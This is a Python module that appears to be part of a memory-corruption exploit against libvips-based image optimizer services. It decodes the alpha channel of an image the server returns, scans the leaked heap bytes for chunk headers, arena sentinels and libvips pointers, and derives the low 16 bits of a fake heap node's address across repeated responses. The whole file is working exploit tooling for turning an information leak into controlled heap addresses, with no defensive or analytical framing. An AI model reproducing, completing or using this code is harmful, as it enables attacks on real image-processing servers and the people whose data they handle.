#!/usr/bin/env python3
"""Resolve the plane-map selector from returned pixels and strict profiles."""

from __future__ import annotations

import hashlib
import io
import struct

from PIL import Image, UnidentifiedImageError

from stack_profile import NativeStackProfile


_QWORD = struct.Struct("<Q")


def _qword(alpha: bytes, position: int) -> int:
    return _QWORD.unpack_from(alpha, position)[0]


def _in_pointer_range(value: int, profile: NativeStackProfile) -> bool:
    leak = profile.libvips.leak
    return leak.pointer_min <= value < leak.pointer_max


def _record_result(
    *,
    position: int,
    anchor: int,
    related: int,
    peer: int,
    profile: NativeStackProfile,
    libvips_references: tuple[int, int, int],
    extra: dict[str, object],
) -> dict[str, object] | None:
    calibration = profile.heap_calibration
    arena_base = anchor & ~(calibration.arena_alignment - 1)
    anchor_page = anchor & ~(calibration.anchor_alignment - 1)
    fake_node = anchor_page + calibration.fake_node_delta_from_anchor_page
    if fake_node & ~(calibration.arena_alignment - 1) != arena_base:
        return None
    return {
        "response_offset": hex(position),
        "arena_base": hex(arena_base),
        "related_pointer": hex(related),
        "anchor": hex(anchor),
        "anchor_page": hex(anchor_page),
        "anchor_page_offset": hex(anchor - anchor_page),
        "anchor_page_low16": hex(anchor_page & 0xFFFF),
        "anchor_alignment": hex(calibration.anchor_alignment),
        "peer": hex(peer),
        "peer_delta": hex(peer - anchor),
        "libvips_references": [hex(value) for value in libvips_references],
        "fake_node_delta_from_anchor_page": hex(
            calibration.fake_node_delta_from_anchor_page
        ),
        "derived_fake_node": hex(fake_node),
        "derived_selector": hex(fake_node & 0xFFFF),
        **extra,
    }


def _match_marked_record(
    alpha: bytes,
    position: int,
    profile: NativeStackProfile,
    libvips_base: int,
) -> dict[str, object] | None:
    calibration = profile.heap_calibration
    anchor = _qword(alpha, position)
    if not _in_pointer_range(anchor, profile):
        return None
    arena_base = anchor & ~(calibration.arena_alignment - 1)
    peer = anchor + calibration.anchor_peer_delta
    related = _qword(alpha, position - 5 * 8)
    related_delta = related - anchor
    expected_libvips = tuple(
        libvips_base + offset
        for offset in calibration.libvips_record_offsets
    )
    checks = (
        _qword(alpha, position - 6 * 8)
        == calibration.record_chunk_size_and_flags,
        related & ~(calibration.arena_alignment - 1) == arena_base,
        calibration.related_pointer_delta_min
        <= related_delta
        < calibration.related_pointer_delta_max,
        _qword(alpha, position - 4 * 8)
        == arena_base + calibration.arena_sentinel_offset,
        _qword(alpha, position - 3 * 8) == 0,
        _qword(alpha, position - 2 * 8) == 0,
        _qword(alpha, position - 1 * 8) == peer,
        _qword(alpha, position + 1 * 8) == peer,
        _qword(alpha, position + 2 * 8) == expected_libvips[0],
        _qword(alpha, position + 3 * 8) == expected_libvips[1],
        _qword(alpha, position + 4 * 8) == calibration.record_marker,
        _qword(alpha, position + 5 * 8) == 0,
        _qword(alpha, position + 6 * 8) == expected_libvips[2],
    )
    if not all(checks):
        return None
    return _record_result(
        position=position,
        anchor=anchor,
        related=related,
        peer=peer,
        profile=profile,
        libvips_references=expected_libvips,
        extra={
            "arena_sentinel": hex(
                arena_base + calibration.arena_sentinel_offset
            ),
            "related_pointer_delta": hex(related_delta),
            "record_marker": hex(calibration.record_marker),
        },
    )


def _match_pie_tail_record(
    alpha: bytes,
    position: int,
    profile: NativeStackProfile,
    libvips_base: int,
) -> dict[str, object] | None:
    calibration = profile.heap_calibration
    prefix = tuple(
        _qword(alpha, position - (9 - index) * 8)
        for index in range(6)
    )
    if prefix != calibration.record_prefix_qwords:
        return None
    expected_libvips = tuple(
        libvips_base + offset
        for offset in calibration.libvips_record_offsets
    )
    if (
        _qword(alpha, position) != expected_libvips[0]
        or _qword(alpha, position + 1 * 8) != expected_libvips[1]
        or _qword(alpha, position + 3 * 8) != 0
        or _qword(alpha, position + 4 * 8) != expected_libvips[2]
    ):
        return None
    anchor = _qword(alpha, position - 3 * 8)
    related = _qword(alpha, position - 2 * 8)
    peer = _qword(alpha, position - 1 * 8)
    if not all(
        _in_pointer_range(value, profile)
        for value in (anchor, related, peer)
    ):
        return None
    if peer != anchor + calibration.anchor_peer_delta:
        return None
    anchor_page = anchor & ~(calibration.anchor_alignment - 1)
    anchor_page_offset = anchor - anchor_page
    if not (
        calibration.anchor_page_offset_min
        <= anchor_page_offset
        < calibration.anchor_page_offset_max
    ):
        return None
    if anchor_page & 0xFFFF != calibration.anchor_page_low16:
        return None
    return _record_result(
        position=position,
        anchor=anchor,
        related=related,
        peer=peer,
        profile=profile,
        libvips_references=expected_libvips,
        extra={
            "record_prefix_qwords": [hex(value) for value in prefix],
            "variable_marker": hex(_qword(alpha, position + 2 * 8)),
        },
    )


def analyze_heap_calibration(
    image_bytes: bytes,
    profile: NativeStackProfile,
    libvips_base: int,
) -> dict[str, object]:
    """Return one selector only for one complete heap-record match."""
    if libvips_base & (profile.libvips.leak.base_alignment - 1):
        raise ValueError("libvips base is not page-aligned")
    try:
        with Image.open(io.BytesIO(image_bytes)) as image:
            rgba = image.convert("RGBA")
            width, height = rgba.size
            alpha = rgba.getchannel("A").tobytes()
    except (OSError, UnidentifiedImageError) as error:
        raise ValueError("optimizer response is not a decodable image") from error

    calibration = profile.heap_calibration
    if calibration.record_variant == "marked_arena":
        record_before, record_after = 6, 6
        matcher = _match_marked_record
    else:
        record_before, record_after = 9, 4
        matcher = _match_pie_tail_record
    start = max(calibration.scan_start, record_before * 8)
    end = min(
        calibration.scan_end,
        len(alpha) - (record_after + 1) * 8 + 1,
    )
    matches = []
    if start < end:
        for position in range(start, end, 8):
            match = matcher(alpha, position, profile, libvips_base)
            if match is not None:
                matches.append(match)

    if calibration.record_variant == "marked_arena":
        matches.sort(key=lambda match: int(str(match["anchor"]), 0))
        rank = calibration.anchor_rank
        record_selectors = (
            [matches[rank]["derived_selector"]] if rank < len(matches) else []
        )
    else:
        rank = None
        record_selectors = sorted({match["derived_selector"] for match in matches})
    profile_selector = None
    profile_selector_evidence = None
    if calibration.selector_strategy == "profile_page_lane":
        profile_selector = hex(
            (
                calibration.anchor_page_low16
                + calibration.fake_node_delta_from_anchor_page
            )
            & 0xFFFF
        )
        selectors = sorted({*record_selectors, profile_selector})
        profile_selector_evidence = {
            "anchor_page_low16": hex(calibration.anchor_page_low16),
            "fake_node_delta_from_anchor_page": hex(
                calibration.fake_node_delta_from_anchor_page
            ),
            "derivation": (
                f"({calibration.anchor_page_low16:#x} + "
                f"{calibration.fake_node_delta_from_anchor_page:#x}) "
                f"& 0xffff = {profile_selector}"
            ),
        }
        selector_source = (
            "profile_page_lane_and_returned_record"
            if record_selectors else "profile_page_lane"
        )
    else:
        selectors = record_selectors
        selector_source = "returned_record"
    status = "no_match" if not selectors else "candidates"
    return {
        "status": status,
        "profile_id": profile.profile_id,
        "libvips_base": hex(libvips_base),
        "record_variant": calibration.record_variant,
        "selector_strategy": calibration.selector_strategy,
        "selector_source": selector_source,
        "profile_candidate_selector": profile_selector,
        "profile_selector_evidence": profile_selector_evidence,
        "record_candidate_selectors": record_selectors,
        "response_sha256": hashlib.sha256(image_bytes).hexdigest(),
        "image": {
            "width": width,
            "height": height,
            "alpha_bytes": len(alpha),
        },
        "match_count": len(matches),
        "selected_anchor_rank": rank,
        "matches": matches,
        "candidate_selectors": selectors,
    }


def resolve_heap_selector(
    observations: list[dict[str, object]],
    profile: NativeStackProfile,
) -> int | None:
    """Resolve one selector supported by the configured response count."""
    support: dict[str, list[int]] = {}
    for index, observation in enumerate(observations):
        selectors = observation.get("candidate_selectors", [])
        if not isinstance(selectors, list):
            raise ValueError("heap calibration candidates have an invalid type")
        for selector in set(selectors):
            if not isinstance(selector, str):
                raise ValueError("heap calibration selector has an invalid type")
            support.setdefault(selector, []).append(index)
    eligible = [
        selector for selector, indexes in support.items()
        if len(indexes) >= profile.heap_calibration.minimum_observations
    ]
    if not eligible:
        return None
    if len(eligible) > 1:
        raise ValueError("ambiguous supported heap calibration selectors")
    selector = eligible[0]
    result = int(selector, 0)
    if not 0 <= result <= 0xFFFF:
        raise ValueError("heap calibration selector exceeds two bytes")
    return result
